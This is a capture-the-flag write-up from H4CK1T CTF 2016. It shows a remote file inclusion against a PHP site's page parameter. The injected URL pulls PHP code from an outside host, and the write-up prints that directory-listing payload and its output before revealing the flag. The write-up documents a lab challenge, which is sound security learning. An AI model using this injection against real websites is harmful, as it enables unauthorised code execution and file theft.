#Write-up Remote pentest (Mexico) - H4CK1T CTF 2016

Challenge text:
Our foreign partners have some problems with qualified staff in the field of information technology, we decided to help them and to conduct remote testing of their new website. Your task is to find a hole in the system and grab some information to confirm the hack .Good luck !

Challenge URL:
>http://91.231.84.36:9150

The challenge is to test the remote website for any vulnerabilities. After some searching I found the website was vulnerable to PHP injection.
I tested this by uploading my TXT-file with PHP code to a webserver. Then I opened the TXT-file on the website and saw a listing of files.

The injection on the website happens as follows:
> http://91.231.84.36:9150/index.php?page=http://whoisdere.r4u.nl/hack.txt?

Normally it would show page=about or page=services or page=contact, because those are the default pages where the site links to. Now we have injected another file from another host, including the code, which is executed by PHP on the website.
This results in the following PHP-code to be executed on the website:

><?php <br/>
> <br/>
>$dir = "/var/www/srv/www"; <br/>
>$dh  = opendir($dir); <br/>
>while (false !== ($filename = readdir($dh))) { <br/>
>    $files[] = $filename; <br/>
>} <br/>

>sort($files); <br/>
>print_r($files); <br/>
>rsort($files); <br/>
>print_r($files);<br/> ?> <br/>

All files in the folder /var/www/srv/www are printed, where one of the files is: sup3r_$3cr3t_f1le.php.

>Array <br/>
( <br/>
    [0] => . <br/>
    [1] => .. <br/>
    [2] => .htaccess <br/>
    [3] => about.php <br/>
    [4] => contact.php <br/>
    [5] => css <br/>
    [6] => fonts <br/>
    [7] => index.php <br/>
    [8] => js <br/>
    [9] => php.ini <br/>
    [10] => services.php <br/>
    [11] => sup3r_$3cr3t_f1le.php <br/>
) <br/>
Array <br/>
( <br/>
    [0] => sup3r_$3cr3t_f1le.php <br/>
    [1] => services.php <br/>
    [2] => php.ini <br/>
    [3] => js <br/>
    [4] => index.php <br/>
    [5] => fonts <br/>
    [6] => css <br/>
    [7] => contact.php <br/>
    [8] => about.php <br/>
    [9] => .htaccess <br/>
    [10] => .. <br/>
    [11] => . <br/>
) <br/>

Obviously, we know this folder as the default apache folder is /var/www/. From there we can continuously change the code, so another subfolder can be viewed. Eventually you will find the folder with this file.

By browsing to the file sup3r_$3cr3t_f1le.php, you will find the flag:
> h4ck1t{g00d_rfi_its_y0ur_fl@g}
